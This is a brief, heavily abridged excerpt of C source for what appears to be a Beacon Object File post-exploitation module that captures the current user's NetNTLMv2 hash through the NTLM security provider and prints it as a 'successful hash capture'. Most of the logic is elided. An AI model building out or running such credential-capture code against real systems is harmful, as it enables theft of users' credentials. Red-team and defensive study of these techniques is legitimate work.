...
BOOL GetNTLMChallengeAndResponse(BOF_Buffer* buffer)
{
	...
	DWORD status = SECUR32$AcquireCredentialsHandleA(
		NULL,
		ntlmsp_name,
	...
	BofPrintf(buffer, "[+] Successful NetNTLMv2 hash capture:\n");
	BofPrintf(buffer, "========================================\n\n");
...
int go()
{
	...
	result = GetNTLMChallengeAndResponse(&buffer);
